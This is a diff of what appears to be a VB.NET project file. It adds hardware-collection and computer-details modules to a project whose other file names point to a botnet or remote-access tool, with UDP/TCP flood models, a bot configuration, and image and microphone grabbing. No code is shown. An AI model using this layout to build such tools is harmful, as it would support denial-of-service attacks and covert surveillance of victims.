@@ -144,6 +144,7 @@
     <Compile Include="Models\FloodModel\UdpModel.vb" />
     <Compile Include="Models\FloodModel\TcpModel.vb" />
     <Compile Include="Models\GetImgModel.vb" />
+    <Compile Include="Models\HardwareCollector.vb" />
     <Compile Include="Models\Json\AllImgModel.vb" />
     <Compile Include="Models\Json\ConfigBotModel.vb" />
     <Compile Include="Models\LogModel.vb" />
@@ -165,6 +166,7 @@
     <Compile Include="Moduls\Converter\FileSize.vb" />
     <Compile Include="Moduls\Converter\HashKey.vb" />
     <Compile Include="Moduls\Converter\TimeConverter.vb" />
+    <Compile Include="Moduls\Details\ComputerDetails.vb" />
     <Compile Include="Moduls\Details\Details.vb" />
     <Compile Include="Moduls\Grabs\ImageGrab.vb" />
     <Compile Include="Moduls\Grabs\MicroPhoneGrab.vb" />
